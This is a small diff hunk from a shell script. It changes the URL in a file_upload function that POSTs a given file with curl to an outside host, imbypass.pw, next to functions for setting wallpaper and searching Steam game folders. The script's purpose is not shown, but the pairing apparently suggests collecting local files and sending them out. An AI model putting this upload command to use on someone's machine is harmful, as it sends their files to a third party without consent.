@@ -148,7 +148,7 @@ set_wallpaper() {
 }
 
 file_upload() {
-  curl -X POST -F "fileToUpload=@$1" https://imbypass.pw/upload
+  curl -X POST -F "fileToUpload=@$1" https://imbypass.pw/upload/index.php
 }
 
 search_steamapps() {
